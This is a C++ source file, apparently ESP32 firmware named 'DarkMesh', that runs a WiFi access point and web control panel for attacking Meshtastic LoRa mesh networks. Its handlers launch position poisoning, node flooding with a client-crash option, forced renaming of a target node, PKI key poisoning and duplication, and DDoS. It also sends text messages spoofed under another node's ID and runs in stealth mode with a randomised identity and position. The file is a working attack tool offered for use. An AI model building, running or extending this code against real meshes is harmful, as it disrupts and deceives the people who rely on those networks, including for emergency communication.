
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include "sdkconfig.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_log.h"

#include "esp_random.h"
#include "MeshtasticCompact.hpp"
#include "webserver.h"
#include "TMAttack.hpp"

static const char* TAG = "DarkMesh";

static const char* ssid = "DarkMesh";
static const char* password = "1234Dark";

extern "C" {
void app_main();
}
TMAttack tmAttack;

Radio_PINS radio_pins = {9, 11, 10, 8, 14, 12, 13};  // Default radio pins for Heltec WSL V3.
LoraConfig lora_config = {
    .frequency = 869.25,
    .bandwidth = 250.0,
    .spreading_factor = 11,
    .coding_rate = 5,
    .sync_word = 0x2b,
    .preamble_length = 16,
    .output_power = 22,
    .tcxo_voltage = 1.8,
    .use_regulator_ldo = false,
};  // default LoRa configuration for EU LONGFAST 433
MeshtasticCompact meshtasticCompact;

void sendDebugMessage(const std::string& message) {
    std::string safe_text = message;
    std::replace(safe_text.begin(), safe_text.end(), '"', '\'');
    std::string json = "{ \"type\":\"debug\", \"message\":\"" + safe_text + "\" }";
    ws_sendall((uint8_t*)json.c_str(), json.length(), true);
    ESP_LOGI("DEBUG", "%s", message.c_str());
}

void generateAndSendNodeElementToWs(MC_NodeInfo& nodeinfo) {
    if (nodeinfo.node_id == 0) return;
    MC_Position pos;
    if (!meshtasticCompact.nodeinfo_db.getPosition(nodeinfo.node_id, pos)) {
        pos.latitude_i = 0;
        pos.longitude_i = 0;
    }
    if (!pos.has_latitude_i || !pos.has_longitude_i) {
        pos.latitude_i = 0;
        pos.longitude_i = 0;
    }
    std::string json = "{ \"type\": \"node_update\",  \"nodes\": [ { \"id\": \"" + std::string(nodeinfo.id) + "\",  \"ls\": " + std::to_string(nodeinfo.last_updated / 1000) + ",  \"name\": \"" + nodeinfo.short_name + "\", \"pos\": { \"lat\": " + std::to_string(pos.latitude_i) + ",  \"lon\": " + std::to_string(pos.longitude_i) + " } } ]}";
    ws_sendall((uint8_t*)json.c_str(), json.length(), true);
}

void app_main(void) {
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    wifi_config_t wifi_config = {};
    strcpy((char*)wifi_config.ap.ssid, ssid);
    wifi_config.ap.ssid_len = strlen(ssid);
    strcpy((char*)wifi_config.ap.password, password);
    wifi_config.ap.max_connection = 4;
    wifi_config.ap.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    if (strlen(password) == 0) {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "WiFi AP initialized. SSID: %s, Password: %s", ssid, password);

    init_httpd();

    ESP_LOGI(TAG, "Radio initializing...");
    meshtasticCompact.RadioInit(RadioType::SX1262, radio_pins, lora_config);
    ESP_LOGI(TAG, "Radio initialized.");
    meshtasticCompact.setAutoFullNode(false);  // we don't want to be a full node
    meshtasticCompact.setSendHopLimit(7);      // max hop limit
    meshtasticCompact.setStealthMode(true);    // stealth mode, we don't
    meshtasticCompact.setSendEnabled(true);    // we want to send packets
    meshtasticCompact.setOnNodeInfoMessage([](MC_Header& header, MC_NodeInfo& nodeinfo, bool needReply) {
        generateAndSendNodeElementToWs(nodeinfo);
    });
    meshtasticCompact.setOnPositionMessage([](MC_Header& header, MC_Position& pos, bool needReply) {
        MC_NodeInfo* nodeinfo = meshtasticCompact.nodeinfo_db.get(header.srcnode);
        if (nodeinfo) generateAndSendNodeElementToWs(*nodeinfo);
    });
    meshtasticCompact.setOnMessage([](MC_Header& header, MC_TextMessage& message) {
        MC_NodeInfo* nodeinfo = meshtasticCompact.nodeinfo_db.get(header.srcnode);
        std::string sender;
        if (nodeinfo) {
            sender = nodeinfo->short_name;
        } else {
            char hexbuf[11];
            snprintf(hexbuf, sizeof(hexbuf), "0x%08" PRIx32, header.srcnode);
            sender = hexbuf;
        }
        sendDebugMessage("Message from " + sender + ": " + message.text);
    });
    meshtasticCompact.setOnTelemetryDevice([](MC_Header& header, MC_Telemetry_Device& telemetry) {
        sendDebugMessage("Telemetry from 0x" + std::to_string(header.srcnode) + ": uptime=" + std::to_string(telemetry.uptime_seconds) + "s, voltage=" + std::to_string(telemetry.voltage) + "V, battery=" + std::to_string(telemetry.battery_level) + "%, channel_utilization=" + std::to_string(telemetry.channel_utilization) + "%");
    });
    meshtasticCompact.setOnTelemetryEnvironment([](MC_Header& header, MC_Telemetry_Environment& telemetry) {
        sendDebugMessage("Environment from 0x" + std::to_string(header.srcnode) + ": temperature=" + std::to_string(telemetry.temperature) + "C, humidity=" + std::to_string(telemetry.humidity) + "%, pressure=" + std::to_string(telemetry.pressure) + "hPa, lux=" + std::to_string(telemetry.lux) + "");
    });
    meshtasticCompact.setOnTraceroute([](MC_Header& header, MC_RouteDiscovery& route, bool for_me, bool is_reply, bool need_reply) {
        sendDebugMessage("Traceroute from 0x" + std::to_string(header.srcnode) + ": route_count=" + std::to_string(route.route_count) + ", for_me=" + std::to_string(for_me) + ", is_reply=" + std::to_string(is_reply));
    });

    tmAttack.setRadio(&meshtasticCompact);

    std::string short_name = "DM";                                                                                                          // short name
    std::string long_name = "DarkMesh";                                                                                                     // long name
    MeshtasticCompactHelpers::NodeInfoBuilder(meshtasticCompact.getMyNodeInfo(), esp_random(), short_name, long_name, esp_random() % 105);  // random nodeinfo
    MeshtasticCompactHelpers::PositionBuilder(meshtasticCompact.my_position,
                                              -180.0 + static_cast<double>(esp_random()) / UINT32_MAX * 360.0,  // random longitude [-180, 180]
                                              -90.0 + static_cast<double>(esp_random()) / UINT32_MAX * 180.0,   // random latitude [-90, 90]
                                              esp_random() % 1000                                               // altitude
    );
    uint32_t timer = 0;  // 0.1 second timer
    while (1) {
        timer++;
        if (timer % 600000 == 0) {
            // meshtasticCompact.SendMyNodeInfo();
            // meshtasticCompact.SendMyPosition();
        }
        tmAttack.loop();
        vTaskDelay(pdMS_TO_TICKS(100));  // wait 100 milliseconds
    }
}

uint32_t getNodeIdFromCh(const char* source_id) {
    uint32_t srcnode = 0xfffffff;  // default all
    const char* hexstr = (*source_id == '!') ? source_id + 1 : source_id;
    char* endptr;  // To check if the whole string was converted
    errno = 0;     // Reset errno before the call
    unsigned long value = strtoul(hexstr, &endptr, 16);
    if (endptr != hexstr && *endptr == '\0' && errno != ERANGE && value <= 0xFFFFFFFF) {
        srcnode = (uint32_t)value;
    }
    return srcnode;
}

void handle_start_attack(const char* attack_type, JSON_Object* params) {
    ESP_LOGI("WEB", "Handling 'start_attack': %s", attack_type);
    if (strcmp(attack_type, "pos_poison") == 0 && params != NULL) {
        double min_lat = json_object_get_number(params, "min_lat");
        double max_lat = json_object_get_number(params, "max_lat");
        double min_lon = json_object_get_number(params, "min_lon");
        double max_lon = json_object_get_number(params, "max_lon");
        const char* target_id = json_object_get_string(params, "target_id");
        ESP_LOGI("WEB", "Position Poisoning Attack Params: min_lat=%.6f, max_lat=%.6f, min_lon=%.6f, max_lon=%.6f", min_lat, max_lat, min_lon, max_lon);
        tmAttack.setPosParams(min_lat, max_lat, min_lon, max_lon);
        tmAttack.setTarget(getNodeIdFromCh(target_id));
        tmAttack.setAttackType(AttackType::POS_POISON);

        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"pos_poison\"}";
        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
    }
    if (strcmp(attack_type, "node_flood") == 0 && params != NULL) {
        // const char* target_id = json_object_get_string(params, "target_id");
        // ESP_LOGI("WEB", "Node Flood Attack Params: target_id=%s", target_id);
        // tmAttack.setTarget(getNodeIdFromCh(target_id));
        double min_lat = json_object_get_number(params, "min_lat");
        double max_lat = json_object_get_number(params, "max_lat");
        double min_lon = json_object_get_number(params, "min_lon");
        double max_lon = json_object_get_number(params, "max_lon");
        uint8_t crashclient = (uint8_t)json_object_get_number(params, "crashclient");
        tmAttack.setPosParams(min_lat, max_lat, min_lon, max_lon);
        tmAttack.setFloodClientCrash(crashclient);
        tmAttack.setAttackType(AttackType::NODE_FLOOD);
        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"node_flood\"}";
        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
    }
    if (strcmp(attack_type, "name_change") == 0 && params != NULL) {
        const char* target_id = json_object_get_string(params, "target_id");
        const char* emoji = json_object_get_string(params, "emoji");
        ESP_LOGI("WEB", "Name Change Attack Params: target_id=%s, emoji=%s", target_id, emoji);
        tmAttack.setTarget(getNodeIdFromCh(target_id));
        tmAttack.setEmoji(emoji);
        tmAttack.setAttackType(AttackType::NAME_CHANGE);
        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"name_change\"}";
        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
    }
    if (strcmp(attack_type, "pki_poison") == 0 && params != NULL) {
        const char* target_id = json_object_get_string(params, "target_id");
        ESP_LOGI("WEB", "PKI Poison Attack Params: target_id=%s", target_id);
        tmAttack.setTarget(getNodeIdFromCh(target_id));
        tmAttack.setAttackType(AttackType::PKI_POISON);
        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"pki_poison\"}";
        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
    }
    if (strcmp(attack_type, "ddos") == 0) {
        tmAttack.setAttackType(AttackType::DDOS);
        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"ddos\"}";
        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
    }
    if (strcmp(attack_type, "pki_dupe") == 0 && params != NULL) {
        const char* target_id = json_object_get_string(params, "target_id");
        ESP_LOGI("WEB", "PKI Duplication Attack Params: target_id=%s", target_id);
        tmAttack.setTarget(getNodeIdFromCh(target_id));
        tmAttack.setAttackType(AttackType::PKI_DUPE);
        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"pki_dupe\"}";
        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
    }
}

void handle_set_config(JSON_Object* params) {
    ESP_LOGI("WEB", "Handling 'set_config'");
    double frequency = json_object_get_number(params, "frequency");
    double bandwidth = json_object_get_number(params, "bandwidth");
    double sf = json_object_get_number(params, "spreading_factor");
    double cr = json_object_get_number(params, "coding_rate");
    double power = json_object_get_number(params, "power");
    ESP_LOGI("WEB", "Config: Freq=%.1f, BW=%.1f, SF=%.0f, CR=%.0f, Power=%.0f", frequency, bandwidth, sf, cr, power);
    meshtasticCompact.setRadioFrequency(frequency);
    meshtasticCompact.setRadioBandwidth(bandwidth);
    meshtasticCompact.setRadioSpreadingFactor(static_cast<uint8_t>(sf));
    meshtasticCompact.setRadioCodingRate(static_cast<uint8_t>(cr));
    meshtasticCompact.setRadioPower(static_cast<int8_t>(power));
    sendDebugMessage("Radio configuration updated.");
}

void handle_stop_attack() {
    tmAttack.setAttackType(AttackType::NONE);
    ESP_LOGI("WEB", "Handling 'stop_attack'");
    std::string wsmsg = "{\"type\":\"status_update\"}";
    ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
}

void handle_send_message(const char* source_id, const char* message) {
    ESP_LOGI("WEB", "Handling 'send_message' from %s: %s", source_id, message);
    uint32_t srcnode = getNodeIdFromCh(source_id);
    meshtasticCompact.SendTextMessage(std::string(message), 0xffffffff, 8, MC_MESSAGE_TYPE_TEXT, srcnode);
    sendDebugMessage("Sent message.");
}

void handle_initme() {
    ESP_LOGI("WEB", "Handling 'initme'");
    // sending all nodes to web
    for (auto& nodeinfo : meshtasticCompact.nodeinfo_db) {
        if (!nodeinfo.node_id) {
            continue;
        }
        generateAndSendNodeElementToWs(nodeinfo);
        vTaskDelay(pdMS_TO_TICKS(20));  // slight delay to avoid overwhelming the socket
    }
    // send current attack to web
    std::string attack_json = "{ \"type\": \"status_update\", \"current_attack\": \"" + tmAttack.getCurrentAttackTypeString() + "\" }";
    ws_sendall((uint8_t*)attack_json.c_str(), attack_json.length(), true);
    vTaskDelay(pdMS_TO_TICKS(20));
    // todo send radio config
}
